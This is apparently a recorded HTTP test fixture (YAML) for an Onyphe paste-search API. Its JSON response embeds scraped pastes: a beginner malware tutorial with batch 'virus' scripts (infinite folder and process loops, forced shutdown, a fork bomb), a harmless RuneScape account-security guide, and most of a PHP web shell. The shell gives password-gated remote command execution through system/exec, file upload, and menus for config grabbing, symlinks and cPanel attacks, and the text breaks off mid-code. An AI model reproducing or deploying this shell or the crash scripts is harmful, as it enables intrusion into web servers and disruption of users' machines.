---
http_interactions:
- request:
    method: get
    uri: https://www.onyphe.io/api/search/pastries/content:hacked?apikey=<API_KEY>
    body:
      encoding: US-ASCII
      string: ''
    headers:
      Accept-Encoding:
      - gzip;q=1.0,deflate;q=0.6,identity;q=0.3
      Accept:
      - "*/*"
      User-Agent:
      - Ruby
      Host:
      - www.onyphe.io
  response:
    status:
      code: 200
      message: OK
    headers:
      Server:
      - nginx
      Date:
      - Fri, 16 Nov 2018 11:39:17 GMT
      Content-Type:
      - application/json;charset=UTF-8
      Content-Length:
      - '88640'
      Connection:
      - keep-alive
    body:
      encoding: ASCII-8BIT
      string: !binary |-
        {"count":10,"error":0,"max_page":182,"myip":"<MY_IP>","page":1,"results":[{"@category":"pastries","@timestamp":"2018-11-16T11:20:17.000Z","@type":"doc","content":"SESSION 5\r\n==========\r\n\r\nMALWARES\r\n=========\r\nThe term MALWARE derives from \"MAL+WARES\" which means Malicious Software.\r\nMalwares are the programs, tools, codes or programs that can affect your computer system with or without your permission and can harm you in any way as they want. They can be in any format whether in the form of image , video , executable file, text file etc.\r\n\r\nIMPACT OF MALWARES\r\n==================\r\n\r\n= It can steal your data\r\n= Can consume your resources such as Processor, RAM , Harddrive space etc.\r\n= It can do identity theft\r\n= Can take REMOTE CONTROL of your machine \r\n= Can steal your money and confidential data and destroy your machine\r\n= Can create junks of file and fill your Machine etc.\r\n\r\nTYPES OF MALWARES\r\n=================\r\n\r\n1. Viruses\r\n2. Worms\r\n3. TRojans\r\n4. Ransomwares\r\n5. Adwares\r\n6. Spywares\r\n\t6.1 Keyloggers\r\n7. Botnets\r\n8. Rootkits\r\n\r\n\r\n1. VIRUS\r\n========\r\nVIRUS stands for \"Vital Information Resource Under Seize\"\r\nTHese are the implanted codes or programs which needs human assistance to initiate or execute so that they can get triggered on a particular machine. THey can't be replicated without any human assisstance. \r\n\r\nTypes\r\n=====\r\n1. Boot Sector Viruses : These are those which are implemented in the BIOS or Boot menu of the machine.\r\n2. Directed Viruses : THey just get initiated with the help of self executable codes.\r\n3. PolyMOrphic Viruses : These are the viruses which changes its signature every time when they are executed.\r\n\r\n\"www.virustotal.com\"\r\n\r\nBATCH FILE VIRUS CREATION \r\n=========================\r\n= which will create a folder\r\n\t\r\n\tmkdir hahaha\r\n\r\n= create a folder inside a folder---- infinite times\r\n\t\r\n\t:loop\r\n\tmkdir test\r\n\tcd test\r\n\tgoto loop\r\n\r\n= To Create infinite folder with different name\r\n\t:loop\r\n\tmkdir %random%\r\n\tgoto loop\r\n\r\n= To Create a file\r\n\techo \"hi, you are hacked?\">>hack.txt\r\n\r\n= Shut Down Virus\r\n\tshutdown -s -t 10 -c \"Hacked By Grade 1 Hackers\"\r\n\r\n= To make system Crash\r\n\t:loop\r\n\trun cmd.exe\r\n\trun notepad.exe\r\n\tstart calc.exe\r\n\tstart explorer.exe\r\n\tgoto loop\r\n\r\n=   Fork Bomb\r\n      %0|%0\r\n\r\n2. WORMS\r\n========\r\nWorms are those malicious softwares which replicates into a network without any human assisstance. If a attacker is connected to a network and he\/she ececutes the worm in his\/her own machine it will start its working by replicating. \r\nEG. Stuxnet , Conficker worm\r\n\r\n3. TROJANS\r\n===========\r\nA Trojan is a malicious program which gives you the access of the victim machine's remotely. It is created by RAT Tools (Remote Administration Tools) and we can perform any operation on the Victim machine as we want.\r\n\r\n4. RANSOMWARES\r\n==============\r\nRansomwares are those Malicious Softwares which encrypts all of the data from your peronal computyer system and ask you for the ransom in term of digital currency. eg . Wannacry, Petya Ransomwares\r\n\r\n5. ADWARES\r\n==========\r\nThese are those malicious softwares which acceessed to our machine through globally hosted ads.\r\nEg. Malwares from Torrents\r\n\r\n6. SPYWARES\r\n===========\r\nSpywares are those deadly Malicious Softwares which are designed to spy on your Machine whether located locally or globally.\r\n\r\n\t6.1 KEYLOGGERS\r\n\t===============\r\n\tKeyloggers are the malicious programs which are used to capture the keystroke of a particular Victim Machine whether stored globally or locally.\r\n\r\n\tEg. Ardamax Keylogger, Family Key Logger - Spyarsenal, Refog KeyLogger\r\n\r\n\tCategories\r\n\t==========\r\n\r\n\tScreenshoter : It takes screenshot on every single keystroke you enter.\r\n\r\n\tScreenrecoder : It records in the form of videos.\r\n\r\n\tKey Scrambler : It changes the poatern of the keyboard everytime you enter a keystroke.\r\n\r\n\tTypes of Keyloggers\r\n\t===================\r\n\t1. LOcal Based Keyloggers : THese are those keyloggers which saves the Keystrokes on the Local Machine of the Victim. You have to access the Victim's Machine to capture the Keystrokes. \r\n\r\n\t2. Server Based\/Remote Keyloggers : These are those keyloggers which sent keystrokes to a server through internet globally. A attacker can access the keystrokes globally by accessing the Keylogger Server.\r\n\r\n7. Botnets \r\n==========\r\nBotnets = RoBOT+NETworks\r\nBotnets are those malicious smart programs which runs on the network globally and can provide harm to the clients situated to that networks. \r\nEg. Zeus Botnet etc.\r\n\r\n8. Rootkits\r\n============\r\nThese are those Malicious programs which get stored in the Kernal level or Boot sector level of the Operating systems. \r\n\r\n--------------------------------------------------------------------------------------------------","file":["notepad.exe","explorer.exe","hack.txt","cmd.exe","calc.exe"],"key":"6V4JvPmQ","seen_date":"2018-11-16","size":"4582","source":"pastebin","syntax":"text","title":"MALMALAMLAMALMALMAL","user":"sanjeevmultani"},{"@category":"pastries","@timestamp":"2018-11-16T10:19:54.000Z","@type":"doc","content":"== \"Help! I've been hacked!\" RuneScape Account Security ==\r\n\r\nThis section covers suggestions for those who need help recovering their compromised account as well as those looking to secure their account from being comprimised. It is broken into two parts, prevention and resolution.\r\n\r\nFor your convience, here's the short version:\r\n\r\n'''Prevention TL;DR: Jagex Account Guardian, unique passwords, secure and unused recovery email, updated computer, and a bank pin will save the day.'''\r\n\r\n'''Resolution TL;DR: Use a malware free system, recover from your email if you have one, use accounthelp@jagex.com if you do not'''\r\n\r\n=== Prevention ===\r\n\r\nPreventing account hijacking comes down to eliminating your vulnerability to the three main methods of hacking. Knowledge of these methods will dramatically reduce the chance of becoming victim to them. Before continuing, it is worth noting that the new Jagex Account Guardian is an ''extremely'' valuable tool for securing your account, and will almost fully protect you from each of the methods below.\r\n\r\n1. Phishing:[[BR]]\r\nPhishing is when you are mislead into entering your login details into a replica website of an official website. Phishing in RuneScape is mostly propagated through email, but also through community websites, and other communication platforms. Jagex will always address you by your in-game display name when you are emailed, any emails begining with \"customer\" or \"player\" are phishing attempts.\r\n\r\n2. Malware: keyloggers and RATs:[[BR]]\r\nIf your computer is infected with malware and you are unaware of it, it is very likely the hacker will acquire your login details as well as other information. Most computers become infected either via Java drivebys (running an applet on a malicious website), malicious or infected software that the user has downloaded and run, or other browser security exploits usable either because of an unpatched computer or because they have yet to be patched.\r\n\r\n3. Doxing:[[BR]]\r\nThe last method that is often used to comprimise your account is doxing, short for \"documents\". This method is typically used to abuse the RuneScape recovery system. The hacker will collect pieces of information about their target online or elsewhere if they can (hacking someone they know, for instance), and use it to impersonate their target during the recovery process. \r\n\r\nIf for some reason a player becomes the target of a hacker, the likelihood is that these methods will be used in conjunction. As such, it is important that as many of the following are true:\r\n\r\n * Use unique passwords across all websites. Websites that you've signed up for are frequently hacked or exploited, and their databases are easily made available to someone trying to comprimise your account.\r\n * Use a seperate email and link it to your RuneScape account -- gmail is preferable due to its rigerous security.\r\n * Use strong security questions.\r\n * Use a modern browser, update Java and Flash plugins, and an antivirus program such as Windows Security Essentials (free with windows) or Malwarebytes (free for manual scans)\r\n * Use a display name that is different than your login name, this prevents someone from beginning the recovery process to your account.\r\n * Use a bankpin, preferably not a year (19xx) or a simple sequence (4321). If someone should gain access to your account, this has a high success rate in protecting your items.\r\n * Enable Jagex Account Guardian -- this forces email verification every time you log into your account from an unrecognized device. Consequently if your email is secure, this will prevent anyone from logging into your account so long as they are unable to answer your Jagex Account Guardian security questions. Because of this it is essential that you set these questions on a malware-free computer.\r\n\r\n'''TL;DR: Jagex Account Guardian, unique passwords, secure and unused recovery email, updated computer, and a bank pin will save the day.'''\r\n\r\n=== Resolution ===\r\n\r\nIf you should lose access to your account, the first thing you should do is notify Jagex. You can do so either via the official RuneScape support center, or by emailing accounthelp@jagex.com. This should lock your account and may be the difference between having everything or nothing when you regain access to your account.\r\n\r\nBefore proceeding, you need to determine the nature of the hacking. Were you phished, infected by malware, or doxed and recovered? Here's how to find out:\r\n\r\nMake sure everything you do from here-on-out is done on a malware-free system. If you are unable to verify yourself that your system has not been infected, you are better safe than sorry and should wait to proceed on a clean system. Consider using a mobile version of linux, reinstalling your operating system, or using another computer!\r\n\r\n'''If you have a registered email,''' start by seeing if you are able to access the email account you have tied to your account. If you do not, see below.\r\n\r\n * If you are able to access your email account and has NOT been accessed (check the account activity), the likelihood is that your RuneScape account was phished or recovered through a dox.\r\n\r\n * If you are able to access your email account but is HAS been accessed, the likelihood is that your computer was infected and your email login details were keylogged, but the hacker didn't bother to change your email's password. If this is the case, it is imperative that you ensure your system is clean.\r\n\r\n * If you are NOT able to access your email account, the likelihood is that your computer was infected and the hacker simply changed the password, though it is also possible that you were doxed. Again, make absolutely sure your system is clean before proceeding.\r\n\r\nIf you are able to gain access to your email, it would be wise at this point to change the password on your recovery email, and then begin the recovery process (click the \"Forgot password?\" link) on the official RuneScape website.\r\n\r\nIf you were not able to access your email account and unable regain access via your security questions there, you will need to recover your account by emailing accounthelp@jagex.com. This has a considerably longer turnover time than recovering via your email. After doing this, contact your email provider and see what you need to do to regain access to your email account. It may be quicker to recover your email account, and then use the recovery process on the RuneScape website.\r\n\r\nThe recovery process may take some time. Do not submit duplicate recoveries, it will not make your account be processed faster. If you have enabled the Jagex Account Guardian, you can at least console yourself in knowing that it will be very difficult for your hacker to gain any valuable access to your account.\r\n\r\n'''If you do not have a registered email''', you should begin the account recovery process on the official RuneScape website via the \"Forgot password?\" link. Follow the recovery process, and again, be patient. Submitting multiple recoveries will not make speed anything up.\r\n\r\nIf during this process you are prompted to enter your recovery email, the likelihood is that your hacker has tied the account to their email. You will need to instead have your recovery processed by emailing accounthelp@jagex.com. Be warned, turnover time will be substantially longer this way.\r\n\r\nOne last thing! If you are hacked and do lose items, please understand that Jagex cannot feasibly return lost items because of the ease of abusing such a system. Do the support staff a favor and refrain from asking for your items back -- if they could, they would!\r\n\r\n'''TL;DR: Use a malware free system, recover from your email if you have one, use accounthelp@jagex.com if you do not'''","key":"CNPXMWCZ","seen_date":"2018-11-16","size":"7735","source":"pastebin","syntax":"text"},{"@category":"pastries","@timestamp":"2018-11-16T10:16:23.000Z","@type":"doc","content":"<?php\r\nsession_start();\r\nerror_reporting(0);\r\ndate_default_timezone_set(\"Asia\/Jakarta\");\r\n$xxx = \"7d11e7594ba815f4ef13fa6bf58708e9\";\r\n\/\/ngentot1A\r\nif(get_magic_quotes_gpc()) { \t\r\nfunction VEstripslashes($array) { \t\t\r\nreturn is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array); \t} \t\r\n$_POST = VEstripslashes($_POST); \r\n$_COOKIE = VEstripslashes($_COOKIE); } \r\n\r\nfunction Login() {\r\n\tdie(\"  <title>dorking teros<\/title>\r\n   <\/head>\r\n   <body>\r\n   \t<style>\r\n   \t\tbody {\r\n    background:#222222;\r\n}\r\ninput[type=password] {\r\n\tbackground:transparent;\r\n\tcolor:white;\r\n\tmargin:0 10px;\r\n\tfont-size:13px;\r\n\tborder:2px solid #222222;\r\n}\r\n   \t<\/style>\r\n     \t<center>\r\n     \t<br>\r\n     \t<br>\r\n    <form method=post> \r\n\t\t <input type=password name='xxx'>\r\n      <\/from>\r\n      <center>\r\n      <font color='red'face='Courier New'>\r\n      <h1>BY MY <font color='White'>SIDE <\/h1>\r\n\");\r\n}\r\n\r\nfunction VEsetcookie($k, $v) {\r\n    $_COOKIE[$k] = $v;\r\n    setcookie($k, $v);\r\n}\r\n\r\nif(!empty($xxx)) {\r\n    if(isset($_POST['xxx']) && (md5($_POST['xxx']) == $xxx))\r\n        VEsetcookie(md5($_SERVER['HTTP_HOST']), $xxx);\r\n\r\n    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $xxx))\r\n        Login();\r\n}\r\necho\"\r\n<title>Google<\/title>\r\n\t<meta name='theme-color'content='black'>\r\n   <\/head>\r\n<link href='https:\/\/fonts.googleapis.com\/css?family=Quicksand' rel='stylesheet' type='text\/css'>\";\r\necho\"<center><font color='white'face='Quicksand'size='4'>\";\r\necho\"\r\n<style>\r\n  input[type=submit] {\r\n       background:transparent;\r\n       color:white;\r\n       border: 1px solid white; \r\n       padding:5px 5px 5px 5px;\r\n       }\r\n        input[type=file] {\r\n       background:transparent; \r\n       padding:5px 6px 6px 6px;\r\n       }\r\n       a {\r\ncolor:#fff;\r\n}\r\na:hover {\r\ncolor:green;\r\n}\r\ntd, th, p,table{\r\n\tbackground:transparentpa;\r\n\tborder:2px solid #B0B0B0;\r\n\tcolor:white;\r\n\ttext-align: center;\r\n\t-moz-border-radius: 5px;\r\n-webkit-border-radius: 5px;\r\nborder-radius: 5px;\r\n}\r\nli{\r\n\tbackground:#000000;\r\n\t-moz-border-radius: 2px;\r\n-webkit-border-radius: 2px;\r\nborder-radius: 2px; \r\n  --borderWidth: 2px;\r\n  position: relative;\r\n  border-radius: var(--borderWidth);\r\n}\r\nli:after {\r\n  content: '';\r\n  position: absolute;\r\n  top: calc(-1 * var(--borderWidth));\r\n  left: calc(-1 * var(--borderWidth));\r\n  height: calc(100% + var(--borderWidth) * 2);\r\n  width: calc(100% + var(--borderWidth) * 2);\r\n  background: linear-gradient(60deg, #FF00D4, #f37055, #FF00EE, #FF00CA, #EEFF00, #1098ad, #07b39b, #6fba82);\r\n  border-radius: calc(2 * var(--borderWidth));\r\n  z-index: -1;\r\n  animation: animatedgradient 1s ease alternate infinite;\r\n  background-size: 500% 400%;\r\n}\r\n@keyframes animatedgradient {\r\n\t0% {\r\n\t\tbackground-position: 0% 50%;\r\n\t}\r\n\t50% {\r\n\t\tbackground-position: 100% 50%;\r\n\t}\r\n\t100% {\r\n\t\tbackground-position: 0% 50%;\r\n\t}\r\n}\r\n.result {\r\npadding: 15px;\r\nborder: 1px solid #CCC;\r\nwidth: 500px;\r\nmargin: 0 auto;\r\nborder-radius: 10px;\r\n-moz-border-radius: 10px;\r\n-webkit-border-radius: 10px;\r\n}\r\ntextarea{\r\n\tborder: 1px solid #FF0000;\r\n\toverflow: hidden;\r\n\tbackground:transparent;\r\n\tcolor:white;\r\n\t-moz-border-radius: 5px;\r\n-webkit-border-radius: 5px;\r\nborder-radius: 5px;\r\n}\r\ntextarea {\r\n \tmargin:auto;\r\n \tborder:2px solid #FF0000;\r\n \twidth:100%;\r\n \theight:400px;\r\n \tbackground:transparent;\r\n \tcolor:#b3eeff;\r\n \tpadding:0 2px;\r\n \tfont-size:12px;\r\n}\r\ninput[type=submit]:hover{ \r\n \tborder-bottom:1px solid #FF6100;\r\n \tfont-size:13px; \r\n \tborder-top:1px solid #FF6100; \r\n}\r\nbody {\r\n\twidth: 100wh;\r\n\tbackground:#151515;\r\n\t}\r\na{\r\n\ttext-decoration:none;\r\n\t}\r\nli {\r\n\tdisplay: inline;\r\n\tmargin: 1px;\r\n\tpadding: 1px;\r\n}\r\n#menu a{\r\n\tpadding:4px 19px;\r\n\tmargin:0;\r\n\tbackground:transparent;\r\n\ttext-decoration:none;\r\n\tletter-spacing:2px;\r\n\t-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;\r\n\r\n}\r\n#menu a:hover{\r\n\tbackground:#EEFF00;\r\n\tborder-bottom:1px solid #FF0000;\r\n\tborder-top:1px solid #FF0000;\r\n}\r\ninput[type=text], option, select { \r\n \tpadding:1px; \r\n \tbackground: linear-gradient(-45deg, #FF00CF, #A100C9, #8D8F8F, #FF009B);\r\n\tbackground-size: 400% 400%;\r\n\t-webkit-animation: Gradient 1s ease infinite;\r\n\t-moz-animation: Gradient 1s ease infinite;\r\n\tanimation: Gradient 1s ease infinite;\r\n}\r\n\r\n@-webkit-keyframes Gradient {\r\n\t0% {\r\n\t\tbackground-position: 0% 50%\r\n\t}\r\n\t50% {\r\n\t\tbackground-position: 100% 50%\r\n\t}\r\n\t100% {\r\n\t\tbackground-position: 0% 50%\r\n\t}\r\n}\r\n\r\n@-moz-keyframes Gradient {\r\n\t0% {\r\n\t\tbackground-position: 0% 50%\r\n\t}\r\n\t50% {\r\n\t\tbackground-position: 100% 50%\r\n\t}\r\n\t100% {\r\n\t\tbackground-position: 0% 50%\r\n\t}\r\n}\r\n\r\n@keyframes Gradient {\r\n\t0% {\r\n\t\tbackground-position: 0% 50%\r\n\t}\r\n\t50% {\r\n\t\tbackground-position: 100% 50%\r\n\t}\r\n\t100% {\r\n\t\tbackground-position: 0% 50%\r\n\t}\r\n}\r\nul{\r\n\tborder:2px solid #515151;\r\n\tborder-left:2px solid #FF0100;\r\n\t-moz-border-radius: 5px;\r\n-webkit-border-radius: 5px;\r\nborder-radius: 5px;\r\ndisplay: inline;\r\n\tmargin: 1px;\r\n\tpadding: 1px;\r\n\tbackground: linear-gradient(+103deg,#00A9D7,transparent,#FF0000,transparent);\r\n\tbackground-size: 400% 400%;\r\n\t-webkit-animation: Gradient 2s ease infinite;\r\n\t-moz-animation: Gradient 1s ease infinite;\r\n\tanimation: Gradient 1s ease infinite;\r\n}\r\n\r\n@-webkit-keyframes Gradient {\r\n\t0% {\r\n\t\tbackground-position: 0% 50%\r\n\t}\r\n\t50% {\r\n\t\tbackground-position: 100% 50%\r\n\t}\r\n\t100% {\r\n\t\tbackground-position: 0% 50%\r\n\t}\r\n}\r\n\r\n@-moz-keyframes Gradient {\r\n\t0% {\r\n\t\tbackground-position: 0% 50%\r\n\t}\r\n\t50% {\r\n\t\tbackground-position: 100% 50%\r\n\t}\r\n\t100% {\r\n\t\tbackground-position: 0% 50%\r\n\t}\r\n}\r\n\r\n@keyframes Gradient {\r\n\t0% {\r\n\t\tbackground-position: 0% 50%\r\n\t}\r\n\t50% {\r\n\t\tbackground-position: 100% 50%\r\n\t}\r\n\t100% {\r\n\t\tbackground-position: 0% 50%\r\n\t}\r\n}\r\n<\/style><br><br>\";\r\nfunction w($dir,$perm) {\r\n    if(!is_writable($dir)) {\r\n        return \"<font color=red>\".$perm.\"<\/font>\";\r\n    } else {\r\n        return \"<font color=#00FFDE>\".$perm.\"<\/font>\";\r\n    }\r\n}\r\nfunction r($dir,$perm) {\r\n    if(!is_readable($dir)) {\r\n        return \"<font color=red>\".$perm.\"<\/font>\";\r\n    } else {\r\n        return \"<font color=blue>\".$perm.\"<\/font>\";\r\n    }\r\n}\r\nfunction exe($cmd) {\r\n    if(function_exists('system')) {        \r\n        @ob_start();       \r\n        @system($cmd);     \r\n        $buff = @ob_get_contents();        \r\n        @ob_end_clean();       \r\n        return $buff;  \r\n    } elseif(function_exists('exec')) {        \r\n        @exec($cmd,$results);      \r\n        $buff = \"\";        \r\n        foreach($results as $result) {         \r\n            $buff .= $result;      \r\n        } return $buff;    \r\n    } elseif(function_exists('passthru')) {        \r\n        @ob_start();       \r\n        @passthru($cmd);       \r\n        $buff = @ob_get_contents();        \r\n        @ob_end_clean();       \r\n        return $buff;  \r\n    } elseif(function_exists('shell_exec')) {      \r\n        $buff = @shell_exec($cmd);     \r\n        return $buff;  \r\n    }\r\n}\r\nfunction perms($file){\r\n    $perms = fileperms($file);\r\n    if (($perms & 0xC000) == 0xC000) {\r\n    \/\/ Socket\r\n    $info = 's';\r\n    } elseif (($perms & 0xA000) == 0xA000) {\r\n    \/\/ Symbolic Link\r\n    $info = 'l';\r\n    } elseif (($perms & 0x8000) == 0x8000) {\r\n    \/\/ Regular\r\n    $info = '-';\r\n    } elseif (($perms & 0x6000) == 0x6000) {\r\n    \/\/ Block special\r\n    $info = 'b';\r\n    } elseif (($perms & 0x4000) == 0x4000) {\r\n    \/\/ Directory\r\n    $info = 'd';\r\n    } elseif (($perms & 0x2000) == 0x2000) {\r\n    \/\/ Character special\r\n    $info = 'c';\r\n    } elseif (($perms & 0x1000) == 0x1000) {\r\n    \/\/ FIFO pipe\r\n    $info = 'p';\r\n    } else {\r\n    \/\/ Unknown\r\n    $info = 'u';\r\n    }\r\n        \/\/ Owner\r\n    $info .= (($perms & 0x0100) ? 'r' : '-');\r\n    $info .= (($perms & 0x0080) ? 'w' : '-');\r\n    $info .= (($perms & 0x0040) ?\r\n    (($perms & 0x0800) ? 's' : 'x' ) :\r\n    (($perms & 0x0800) ? 'S' : '-'));\r\n    \/\/ Group\r\n    $info .= (($perms & 0x0020) ? 'r' : '-');\r\n    $info .= (($perms & 0x0010) ? 'w' : '-');\r\n    $info .= (($perms & 0x0008) ?\r\n    (($perms & 0x0400) ? 's' : 'x' ) :\r\n    (($perms & 0x0400) ? 'S' : '-'));\r\n    \/\/ World\r\n    $info .= (($perms & 0x0004) ? 'r' : '-');\r\n    $info .= (($perms & 0x0002) ? 'w' : '-');\r\n    $info .= (($perms & 0x0001) ?\r\n    (($perms & 0x0200) ? 't' : 'x' ) :\r\n    (($perms & 0x0200) ? 'T' : '-'));\r\n    return $info;\r\n}\r\nfunction hdd($s) {\r\n    if($s >= 1073741824)\r\n    return sprintf('%1.2f',$s \/ 1073741824 ).' GB';\r\n    elseif($s >= 1048576)\r\n    return sprintf('%1.2f',$s \/ 1048576 ) .' MB';\r\n    elseif($s >= 1024)\r\n    return sprintf('%1.2f',$s \/ 1024 ) .' KB';\r\n    else\r\n    return $s .' B';\r\n}\r\nfunction ambilKata($param, $kata1, $kata2){\r\n    if(strpos($param, $kata1) === FALSE) return FALSE;\r\n    if(strpos($param, $kata2) === FALSE) return FALSE;\r\n    $start = strpos($param, $kata1) + strlen($kata1);\r\n    $end = strpos($param, $kata2, $start);\r\n    $return = substr($param, $start, $end - $start);\r\n    return $return;\r\n}\r\nfunction getsource($url) {\r\n    $curl = curl_init($url);\r\n            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);\r\n            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);\r\n            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);\r\n            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);\r\n    $content = curl_exec($curl);\r\n            curl_close($curl);\r\n    return $content;\r\n}\r\nfunction bing($dork) {\r\n    $npage = 1;\r\n    $npages = 30000;\r\n    $allLinks = array();\r\n    $lll = array();\r\n    while($npage <= $npages) {\r\n        $x = getsource(\"http:\/\/www.bing.com\/search?q=\".$dork.\"&first=\".$npage);\r\n        if($x) {\r\n            preg_match_all('#<h2><a href=\"(.*?)\" h=\"ID#', $x, $findlink);\r\n            foreach ($findlink[1] as $fl) array_push($allLinks, $fl);\r\n            $npage = $npage + 10;\r\n            if (preg_match(\"(first=\" . $npage . \"&)siU\", $x, $linksuiv) == 0) break;\r\n        } else break;\r\n    }\r\n    $URLs = array();\r\n    foreach($allLinks as $url){\r\n        $exp = explode(\"\/\", $url);\r\n        $URLs[] = $exp[2];\r\n    }\r\n    $array = array_filter($URLs);\r\n    $array = array_unique($array);\r\n    $sss = count(array_unique($array));\r\n    foreach($array as $domain) {\r\n        echo $domain.\"\\n\";\r\n    }\r\n}\r\nfunction reverse($url) {\r\n    $ch = curl_init(\"http:\/\/domains.yougetsignal.com\/domains.php\");\r\n          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );\r\n          curl_setopt($ch, CURLOPT_POSTFIELDS,  \"remoteAddress=$url&ket=\");\r\n          curl_setopt($ch, CURLOPT_HEADER, 0);\r\n          curl_setopt($ch, CURLOPT_POST, 1);\r\n    $resp = curl_exec($ch);\r\n    $resp = str_replace(\"[\",\"\", str_replace(\"]\",\"\", str_replace(\"\\\"\\\"\",\"\", str_replace(\", ,\",\",\", str_replace(\"{\",\"\", str_replace(\"{\",\"\", str_replace(\"}\",\"\", str_replace(\", \",\",\", str_replace(\", \",\",\",  str_replace(\"'\",\"\", str_replace(\"'\",\"\", str_replace(\":\",\",\", str_replace('\"','', $resp ) ) ) ) ) ) ) ) ) ))));\r\n    $array = explode(\",,\", $resp);\r\n    unset($array[0]);\r\n    foreach($array as $lnk) {\r\n        $lnk = \"http:\/\/$lnk\";\r\n        $lnk = str_replace(\",\", \"\", $lnk);\r\n        echo $lnk.\"\\n\";\r\n        ob_flush();\r\n        flush();\r\n    }\r\n        curl_close($ch);\r\n}\r\nif(get_magic_quotes_gpc()) {\r\n    function idx_ss($array) {\r\n        return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);\r\n    }\r\n    $_POST = idx_ss($_POST);\r\n    $_COOKIE = idx_ss($_COOKIE);\r\n}\r\nif(isset($_GET['dir'])) {\r\n    $dir = $_GET['dir'];\r\n    chdir($dir);\r\n} else {\r\n    $dir = getcwd();\r\n}\r\n$kernel = php_uname();\r\n$ip = gethostbyname($_SERVER['HTTP_HOST']);\r\n$dir = str_replace(\"\\\\\",\"\/\",$dir);\r\n$scdir = explode(\"\/\", $dir);\r\n$freespace = hdd(disk_free_space(\"\/\"));\r\n$total = hdd(disk_total_space(\"\/\"));\r\n$used = $total - $freespace;\r\n$sm = (@ini_get(strtolower(\"safe_mode\")) == 'on') ? \"<font color=red>ON<\/font>\" : \"<font color=red>OFF<\/font>\";\r\n$ds = @ini_get(\"disable_functions\");\r\n$mysql = (function_exists('mysql_connect')) ? \"<font color=blue>ON<\/font>\" : \"<font color=red>OFF<\/font>\";\r\n$curl = (function_exists('curl_version')) ? \"<font color=blue>ON<\/font>\" : \"<font color=red>OFF<\/font>\";\r\n$wget = (exe('wget --help')) ? \"<font color=blue>ON<\/font>\" : \"<font color=red>OFF<\/font>\";\r\n$perl = (exe('perl --help')) ? \"<font color=blue>ON<\/font>\" : \"<font color=red>OFF<\/font>\";\r\n$python = (exe('python --help')) ? \"<font color=blue>ON<\/font>\" : \"<font color=red>OFF<\/font>\";\r\n$show_ds = (!empty($ds)) ? \"<font color=red>$ds<\/font>\" : \"<font color=blue>NONE<\/font>\";\r\nif(!function_exists('posix_getegid')) {\r\n    $user = @get_current_user();\r\n    $uid = @getmyuid();\r\n    $gid = @getmygid();\r\n    $group = \"?\";\r\n} else {\r\n    $uid = @posix_getpwuid(posix_geteuid());\r\n    $gid = @posix_getgrgid(posix_getegid());\r\n    $user = $uid['name'];\r\n    $uid = $uid['uid'];\r\n    $group = $gid['name'];\r\n    $gid = $gid['gid'];\r\n}\r\necho\"<center><img src='https:\/\/www.gigabyte.com\/FileUpload\/Global\/GMicroSite\/93\/Activity\/436\/images\/mb_aoruslogo.png'width='200'height='200'><br>\";\r\necho\"<font size='3'>\";\r\nforeach($scdir as $c_dir => $cdir) {\t\r\n\techo \"<a href='?dir=\";\r\n\tfor($i = 0; $i <= $c_dir; $i++) {\r\n\t\techo $scdir[$i];\r\n\t\tif($i != $c_dir) {\r\n\t\techo \"\/\";\r\n\t\t}\r\n\t}\r\n\techo \"'>$cdir<\/a>\/\";\r\n}\r\necho '<pre><center><div id=\"menu\">';\r\necho \"<ul><a style='color: white;' href='?dir=$dir&saf=info'>INFO WEB<\/a><\/ul><br><br>\";\r\necho\"<ul> <a href='?dir=$dir&saf=mass'>MASS<\/a> <\/ul>\";\r\necho\"<li> <a href='?dir=$dir&delete=logs'>LOGS  <\/a> <\/li>\";\r\necho \"<li><a href='?dir=$dir&saf=about'>ABOUT<\/a> <\/li>\";\r\necho\"<ul>   <\/ul>\";\r\necho \"<li><a href='?dir=$dir&do=jumping'>JUMPING<\/a> <\/li>\";\r\necho\"<li> <a href='?dir=$dir&config=grabber'>CONFIG <\/a><\/li>\";\r\necho\"<ul>   <\/ul>\";\r\necho\"<li> <a href='?dir=$dir&sym=brudul'>SYMLINK<\/a><\/li>\";\r\necho\"<li> <a href='?dir=$dir&saf=file'>FILES <\/a> <\/li>\";\r\necho \"<ul> <a href='?dir=$dir&do=shellscanner'>SCANS<\/a> <\/ul><br><br>\";\r\necho \"<ul> <a href='?dir=$dir&upload3=upload'>UPLOAD<\/a> <\/ul>\";\r\necho\"]---[\";\r\necho \"<li> <a href='?dir=$dir&saf=cpanel'>CPANEL<\/a> <\/li>\";\r\necho\"<ul>   <\/ul>\";\r\necho\"<li> <a href='?dir=$dir&saf=cpanel1'>CPANEL1<\/a> <\/li>\";\r\necho\"]---[\";\r\necho \"<ul><a href='?dir=$dir&saf=adminer'>ADMIN<\/a> <\/ul>\";\r\necho\"<\/li><br><br>\";\r\necho\"<li> <a href='?dir=$dir&saf=userx'>USERWP<\/a> <\/li>\";\r\necho\"]--[\";\r\necho \"<ul> <a href='?dir=$dir&saf=config'>CONFIG2<\/a> <\/ul>\";\r\necho\"]--[\";\r\necho \"<li> <a href='?dir=$dir&saf=406'>406 TMP<\/a> <\/li><br><\/pre>\";\r\necho\"<\/div><br>\";\r\n\tif($_POST['do_cmd']) {\r\n\t\techo \"<pre>\".exe($_POST['cmd']).\"<\/pre>\";\r\n\t\t} elseif($_GET['upload3'] == 'upload') {\r\n    echo \"<center>\";\r\n    if($_POST['upload']) {\r\n        if($_POST['tipe_upload'] == 'biasa') {\r\n            if(@copy($_FILES['ix_file']['tmp_name'], \"$dir\/\".$_FILES['ix_file']['name'].\"\")) {\r\n                $act = \"<font color=blue>Uploaded!<\/font> at <i><b>$dir\/\".$_FILES['ix_file']['name'].\"<\/b><\/i>\";\r\n            } else {\r\n                $act = \"<font color=red>failed to upload file<\/font>\";\r\n            }\r\n        } else {\r\n            $root = $_SERVER['DOCUMENT_ROOT'].\"\/\".$_FILES['ix_file']['name'];\r\n            $web = $_SERVER['HTTP_HOST'].\"\/\".$_FILES['ix_file']['name'];\r\n            if(is_writable($_SERVER['DOCUMENT_ROOT'])) {\r\n                